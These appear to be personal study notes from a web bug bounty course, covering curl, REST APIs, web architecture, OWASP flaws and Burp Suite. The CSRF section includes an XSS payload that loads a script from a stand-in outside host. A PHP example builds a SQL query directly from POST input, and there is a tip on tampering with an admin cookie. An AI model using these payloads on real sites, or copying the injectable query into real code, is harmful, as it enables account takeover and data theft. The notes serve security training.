# HTB BUG BOUNTY COURSE #

# Shortcuts
crtl+shift+e # devtools>network
shift+f9 # devtools>storage

# HTTP Headers
curl -v # Shows full details of the http request and response.
curl -I # Only display the response headers
curl -i # Display both the headers and response body
curl -H # Set request headers
curl -A # Set our own user agent
curl -u # provide authentication credentials (e.g. -u admin:admin http://ex or just http://admin:admin/webpage) 
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/ # Authenticating by setting our own header, using base64 of admin:admin
curl -X # Send a post request
curl -L # Follow the redirect
curl -b # Set the cookie. Once authenticated to a site we dont have to authen every time. Use the cookies. Or we can use: curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/

# HTTP Methods
#### Most modern web applications mainly rely on the GET and POST methods. However, any web application that utilizes REST APIs also rely on PUT and DELETE, which are used to update and delete data on the API endpoint, respectively. 
#### Having a valid cookie may be enough to get authenticated into many web applications. This can be an essential part of some web attacks, like Cross-Site Scripting.

# JSON DATA
curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php["London (UK)"] 
# Replicating POST request using JSON

# APIs
#### There are several types of APIs. Many APIs are used to interact with a database, such that we would be able to specify the requested table and the requested row within our API query, and then use an HTTP method to perform the operation needed. 
# Example of API request
curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london ...SNIP...

# CRUD
## Create POST
## Read GET
## Update PUT
## Delete DELETE
# Commonly linked to commonly known CRUD APIs, but the same principles apply with REST APIs.

# Interacting with APIs 

## Reading
curl http://<SERVER_IP>:<PORT>/api.php/city/london

[{"city_name":"London","country_name":"(UK)"}]

curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq # Piped to jq for proper format -s to silent uneeded curl output.

[
  {
    "city_name": "London",
    "country_name": "(UK)"
  }
]

## Creating
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
 
# Check to see if it was added:
curl -s http://<SERVER_IP>:<PORT>/api.php/city/HTB_City | jq

[
  {
    "city_name": "HTB_City",
    "country_name": "HTB"
  }
]

## Updating
# Note: The HTTP PATCH method may also be used to update API entries instead of PUT. To be precise, PATCH is used to partially update an entry (only modify some of its data "e.g. only city_name"), while PUT is used to update the entire entry. We may also use the HTTP OPTIONS method to see which of the two is accepted by the server, and then use the appropriate method accordingly. In this section, we will be focusing on the PUT method, though their usage is quite similar.
curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq

[
  {
    "city_name": "New_HTB_City",
    "country_name": "HTB"
  }
]

## Deleting
curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City
curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq # Nothing there now

# WEB APPLICATIONS

## Web Applications vs Websites
WEB 1.0. - In the past, we interacted with websites that are static and cannot be changed in real-time. This means that traditional websites were statically created to represent specific information, and this information would not change with our interaction. To change the website's content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes.
WEB 2.0. - Presenting dynamic content based on user interaction. Another significant difference is that web applications are fully functional and can perform various functionalities for the end-user, while web sites lack this type of functionality.

### Websites
* Static Pages
* Same for Everyone
### Web Applications
* Dynamic Pages
* Interactive
* Different View for each user.
* Functional
* Being modular
* Running on any display size
* Running on any platform without being optimized

## WEB APP Distros

### OpenSource
* WordPress
* OpenCart
* Joomla

### Proprietary(closed source)
* Wix
* Shopify
* DotNetNuke

# Enter OWASP Security Testing Guide:
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
 
# REAL WORLD WEB APP PENTESTING
Flaw		Real-world Scenario
SQL injection	Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.
File Inclusion	Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.
Unrestricted File Upload	A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.
Insecure Direct Object Referencing (IDOR)	When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the 701 to 702, we may edit another user's profile!
Broken Access Control	Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the POST request when registering a new user, which submits the data username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3. What if we can manipulate the roleid parameter and change it to 0 or 1. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application.

# WEB APPLICATION INFRASTRUCTURE(MODELS)

* Client-Server
* One Server
* Many Servers - One Database
* Many Servers - Many Databases

# WEB APPLICATION COMPONENTS

* Client
* Server
	- Webserver
	- Web Application Logic
	- Database
* Services ( Microservices )
	- 3rd party integrations
	- Web Application Integrations
* Functions (Serverless)

# WEB APPLICATION ARCHITECTURE (THREE TIER ARCHITECTURE)

* Presentation Layer - UI process components.
* Application Layer - ensures web requests are properly processed.
* Data Layer - The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.

# Microservices

### We can think of microservices as independent components of the web application, which in most cases are programmed for one task only.
Examples:
* Registration
* Search
* Payments
* Ratings
* Reviews
### These components communicate with the client and with each other. The communication between these microservices is stateless, which means that the request and response are independent. This is because the stored data is stored separately from the respective microservices. The use of microservices is considered service-oriented architecture (SOA), built as a collection of different automated functions focused on a single business goal. Nevertheless, these microservices depend on each other.
###Another essential and efficient microservice component is that they can be written in different programming languages and still interact. Microservices benefit from easier scaling and faster development of applications, which encourages innovation and speeds upmarket delivery of new features. Some benefits of microservices include:
Examples:
* Agility 
* Flexible Scaling
* Easy Delpoyment
* Reusable Code
* Resiliance
# AWS Whitepaper(Great resource for microservices): https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf

# FRONT END vs BACK END 

### Full Stack web development refers to both front end and back end.

## Front End

* HTML
* CSS
* Javascript
-
* Visual Concept Web Design
* User Interface (UI) design
* User Experience (UX) design

## Back End
### The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with, but a website is just a collection of static web pages without a back end.

### Back End Components

* Back End Servers - The hardware and operating system that hosts all other components and are usually run on operating systems like Linux, Windows, or using Containers.
* Web Servers - Web servers handle HTTP requests and connections. Some examples are Apache, NGINX, and IIS.
* Databases - Databases (DBs) store and retrieve the web application data. Some examples of relational databases are MySQL, MSSQL, Oracle, PostgreSQL, while examples of non-relational databases include NoSQL and MongoDB.
* Development Frameworks - Development Frameworks are used to develop the core Web Application. Some well-known frameworks include PHP, C#, Java, Python, and NodeJS JavaScript.

Some of the main jobs performed by back end components include:

    Develop the main logic and services of the back end of the web application
    Develop the main code and functionalities of the web application
    Develop and maintain the back end database
    Develop and implement libraries to be used by the web application
    Implement technical/business needs for the web application
    Implement the main APIs for front end component communications
    Integrate remote servers and cloud services into the web application

### While HTML and CSS are mainly in charge of how a web page looks, JavaScript is usually used to control any functionality that the front end web page requires. Without JavaScript, a web page would be mostly static and would not have much functionality or interactive elements.
Some of the most common front end JavaScript frameworks are:

    Angular
    React
    Vue
    jQuery

# FRONT END VULNERABILITIES

## Sensitive Data Exposure

### It is important to sanitize user input on the backend and frontend.

### HTML injection occurs when unfiltered user input is displayed on the page.
"When a user has complete control of how their input will be displayed, they can submit HTML code, and the browser may display it as part of the page."

# XSS Cross-site Scripting
- HTML Injection vulnerabilities can often be used to also perform XSS attacks.
- XSS attacks usually utilize javascript as an injection language to perform more advanced attacks.

## Types of XSS
- Reflected XSS = When user input is displayed on the page.
- Stored XSS = When user input is stored in the back end database and then displayed upon retreival.
- DOM XSS = When user input is directly shown in the browser and is written in an HTML DOM object.
-- With DOM, think the ability to display users cookie by accessing HTML doc tree and retrieving the cookie object's value.

# Cross-Site Request Forgery (CSRF)

## CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. 
- Think Cross-Site like XSS and then Request Forgery (requesting things while pretending to be someone else.

Could be used to change a victims password or atacking admins.

## For example, we could load our own .js file using:
"><script src=//www.example.com/exploit.js></script>

### Crafting this .js file requires we know a few things, such as knowledge of the web apps password changing procedures and APIs.

# Prevention Front-End

- Sanitization = Removing special characters and non standard characters from user input before displaying it or storing it.
- Validation = Ensuring that submitted user input matches the expected format(such as email).

## Another prevention technique would be to implement a WAF. Prevents injection attempts automatically.
## "Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection)."

# Back End Servers

## The hardware and operating systems
- Web Server
- Database
- Development Framework
--- Other Components
- Hypervisors
- Containers
- WAFs

# There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components.

Conbinations(Stacks):
LAMP = Linux, Apache, MySQL, and PHP
WAMP = Windows, Apache, MySQL, and PHP
WINS = Windows, IIS, .NET, and SQL Server
MAMP = macOS, Apache, MySQL, and PHP
XAMPP = Cross-Platform, Apache, MySQL, and PHP/Perl
https://en.wikipedia.org/wiki/Solution_stack - Comprehensive List

# Web Servers
- Application that runs on the back end.
- handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser.
- Usually run on ports 80 and 443.

# Workflows
## Many HTTP response codes;
200 Ok
301 Voved Forever
302 Found - address changed temp
400 Bad Request
401 Unauthroized
403 Forbidden
404 Not Found
405 Method Not Allowed
408 Request Timeout
500 Internal Server Error
504 Gateway TImeout
 
## Web servers also accept various types of user input within HTTP requests, including text, JSON, and even binary data (i.e., for file uploads).

# Apache
Apache 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.
Apache is commonly used by startups and smaller companies, as it is straightforward to develop for. Still, some big companies utilize Apache
Apple 	Adobe 	Baidu

# NGINX

The second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. 
60% of the top 100,000 websites are using NGINX.
Google 	Facebook 	Twitter 	Cisco 	Intel 	Netflix 	HackTheBox

# IIS

IIS (Internet Information Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. IIS is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like PHP, or host other types of services like FTP.
Furthermore, IIS is very well optimized for Active Directory integration and includes features like Windows Auth for authenticating users using Active Directory, allowing them to automatically sign in to web applications.
Microsoft 	Office365 	Skype 	Stack Overflow 	Dell

### Aside from these 3 web servers, there are many other commonly used web servers, like Apache Tomcat for Java web applications, and Node.JS for web applications developed using JavaScript on the back end.

# Databases

## Relation(SQL)

- Store their data in tables, rows, and columns.
- Each table can have unique keys, which can link tables together and create relationships between tables.
- The relationship between tables within a database is called a Schema.
- For example, we can retrieve all details linked to a certain user from all tables with a single query. This makes relational databases very fast and reliable for big datasets that have a clear structure and design.
Common Types:
MySQL - Most commonly used database around the internet
MSSQL - Windows implementation
Oracle - Fast, but costly, even for big business.
PostgreSQL - Free and open-source. Designed to be easily extensible.
### Other common SQL databases include: SQLite, MariaDB, Amazon Aurora, and Azure SQL.

## Non-Relational(NoSQL)

- Doesn't use tables, rows, columns, primary keys, relationships, or schemas.
- Stores data using various storage models, depending on the type of data stored.
- Very scalable and flexible.
Common Storage Models:
-- Key-Value
-- Document-Based
-- Wide-Column
-- Graph
### Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:
Common NoSQL Databases:
MongoDB = Most common NoSQL database. Free and open source. Document-Based. Stores data in JSON objects.
ElasticSearch = Free and open source. Used for storing an analyzing huge datasets. fast searching 
Apache Cassandra = Free and open source. Very scalable and is optimized gracefully handling faulty values.

# Use in Web Applications

## For example, within a PHP web application, once MySQL is up and running, we can connect to the database server with:
$conn = new mysqli("localhost", "user", "pass");
## Create a new database with:
$sql = "CREATE DATABASE database1";
$conn->query($sql)
## After that, we can connect to our new database, and start using the MySQL database through MySQL syntax, right within PHP, as follows:
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
## Web applications usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the database(s).
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
## Finally, the web application sends the result back to the user:
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}


# Development Frameworks and APIs

## Most of the popular web applications are developed using web frameworks.

As most web applications share common functionality -such as user registration-, web development frameworks make it easy to quickly implement this functionality and link them to the front end components, making a fully functional web application. Some of the most common web development frameworks include:

*   Laravel (PHP): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
*   Express (Node.JS): used by PayPal, Yahoo, Uber, IBM, and MySpace.
*   Django (Python): used by Google, YouTube, Instagram, Mozilla, and Pinterest.
*   Rails (Ruby): used by GitHub, Hulu, Twitch, Airbnb, and even Twitter in the past.
Note: It must be noted that popular websites usually utilize a variety of frameworks and web servers, rather than just one.

# APIs
## An important aspect of back end web application development is the use of Web APIs and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.

# Query Parameters

## The default method of sending specific arguments to a web page is through GET and POST request parameters. 
For example, a /search.php page would take an item parameter, 
which may be used to specify the search item. 
Passing a parameter through a GET request is done through the URL 
'/search.php?item=apples', while POST parameters are passed through 
POST data at the bottom of the POST HTTP request:
POST /search.php HTTP/1.1
...SNIP...
item=apples

# Web APIs

## An API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the HTTP protocol and are usually handled and translated through web servers.

## A weather web application, for example, may have a certain API to retrieve the current weather for a certain city. We can request the API URL and pass the city name or city id, and it would return the current weather in a JSON object. Another example is Twitter's API, which allows us to retrieve the latest Tweets from a certain account in XML or JSON formats, and even allows us to send a Tweet 'if authenticated', and so on.
Note: To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like SOAP or REST.

# SOAP(Simple Object Access)

- Shares data through xml, where the request is made in XML through an HTTP request, and the response is also returned in XML. Front end components are designed to parse this XML output properly. 
- SOAP is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly.
- It is also very useful for sharing stateful objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.
- However, SOAP may be difficult to use for beginners or require long and complicated requests even for smaller queries, like basic search or filter queries. This is where the REST API standard is more useful.

# REST(Representational State Transfer)

- shares data through the URL path 'i.e. search/users/1', and usually returns the output in JSON format 'i.e. userid 1'.
- Unlike Query Parameters, REST APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. This is usually useful for queries like search, sort, or filter.
- This is why REST APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.
- Responses to REST API requests are usually made in JSON format, and the front end components are then developed to handle this response and render it properly. 
- Other output formats for REST include XML, x-www-form-urlencoded, or even raw data.
- REST uses various HTTP methods to perform different actions on the web application:

    GET request to retrieve data
    POST request to create data
    PUT request to change existing data
    DELETE request to remove data

# Common Vulnerabilites from OWASP Top 10

# Broken Access/Authentication Control
- Most common and dangerous of vulnerabilties 
- Bypass auth functions
- Access features and pages they should not be allowed to access

# Malicious File Uploads
- upload files that could allow command execution on the web server

# Command Injection
- Many Web Apps execute local OS commands to perform certain tasks
- Any place that excepts user input can be tested for command injection

# SQL injection
- Falls under command injection
- Test user input using special characters and SQL queries

# Public Vulnerabilities

- CVEs or Common Vulnerabilites and Exposures
-- Assigned a score
- CVSS or Common Vulnerability Scoring System 
-- Industry standard for assessing the severity of security vulnerabilties 

# CVSS v2 and CVSS v3

National Vulnerability Database (NVD)

CVSS V2.0 Ratings 	
Severity 	Base Score Range
Low 	0.0-3.9
Medium 	4.0-6.9
High 	7.0-10.0

CVSS V3.0 Ratings 	
Severity 	Base Score Range
None 	0.0
Low 	0.1-3.9
Medium 	4.0-6.9
High 	7.0-8.9
Critical 	9.0-10.0

Note: The NVD does not factor in Temporal and Environmental metrics because the former can change over time due to external events.
However, The NVD provides a CVSS v2 calculator and a CVSS v3 calculator that organizations can use to factor additional risk from Temporal and Environmental data unique to them.
Guide: https://www.first.org/cvss/user-guide

# Intro to Web Proxies

# Encoding/Decoding
## It is essential to ensure that our request data is URL-encoded and our request headers are correctly set. Otherwise, we may get a server error in the response. This is why encoding and decoding data becomes essential as we modify and repeat web requests. Some of the key characters we need to encode are:

    Spaces: May indicate the end of request data if not encoded
    &: Otherwise interpreted as a parameter delimiter
    #: Otherwise interpreted as a fragment identifier

## To URL-encode text in Burp Repeater, we can select that text and right-click on it, then select (Convert Selection>URL>URL encode key characters), or by selecting the text and clicking [CTRL+U]. Burp also supports URL-encoding as we type if we right-click and enable that option, which will encode all of our text as we type it.

# Decoding

* Types of encoders supported by both Burpsuite and ZAP:

    HTML
    Unicode
    Base64
    ASCII hex

* In recent versions of Burp, we can also use the Burp Inspector tool to perform encoding and decoding (among other things), which can be found in various places like Burp Proxy or Burp Repeater:

# Encoding
## As we can see, the text holds the value {"username":"guest", "is_admin":false}. So, if we were performing a penetration test on a web application and find that the cookie holds this value, we may want to test modifying it to see whether it changes our user privileges. So, we can copy the above value, change guest to admin and false to true, and try to encode it again using its original encoding method (base64):

# Proxying Tools

! Useful Tip: In proxychains.cnf, we should also enable Quiet Mode to reduce noise by un-commenting quiet_mode.

# Burp intruder

## Both Burp and ZAP provide additional features other than the default web proxy, which are essential for web application penetration testing. Two of the most important extra features are web fuzzers and web scanners. The built-in web fuzzers are powerful tools that act as web fuzzing, enumeration, and brute-forcing tools. This may also act as an alternative for many of the CLI-based fuzzers we use, like ffuf, dirbuster, gobuster, wfuzz, among others.

# Burp Scanner
## An essential feature of web proxy tools is their web scanners. Burp Suite comes with Burp Scanner, a powerful scanner for various types of web vulnerabilities, using a Crawler for building the website structure, and Scanner for passive and active scanning.

# Passive Scanner and Active Scanner

# Passive Scanning
## Unlike an Active Scan, a Passive Scan does not send any new requests but analyzes the source of pages already visited in the target/scope and then tries to identify potential vulnerabilities. This is very useful for a quick analysis of a specific target, like missing HTML tags or potential DOM-based XSS vulnerabilities. However, without sending any requests to test and verify these vulnerabilities, a Passive Scan can only suggest a list of potential vulnerabilities. Still, Burp Passive Scanner does provide a level of Confidence for each identified vulnerability, which is also helpful for prioritizing potential vulnerabilities.

# Active Scanning
## We finally reach the most powerful part of Burp Scanner, which is its Active Vulnerability Scanner. An active scan runs a more comprehensive scan than a Passive Scan, as follows:

    It starts by running a Crawl and a web fuzzer (like dirbuster/ffuf) to identify all possible pages

    It runs a Passive Scan on all identified pages

    It checks each of the identified vulnerabilities from the Passive Scan and sends requests to verify them

    It performs a JavaScript analysis to identify further potential vulnerabilities

    It fuzzes various identified insertion points and parameters to look for common vulnerabilities like XSS, Command Injection, SQL Injection, and other common web vulnerabilities

# Burp's Reporting
## once all of our scans are completed, and all potential issues have been identified, we can go to (Target>Site map), right-click on our target, and select (Issue>Report issues for this host). We will get prompted to select the export type for the report and what information we would like to include in the report. Once we export the report, we can open it in any web browser to view its details





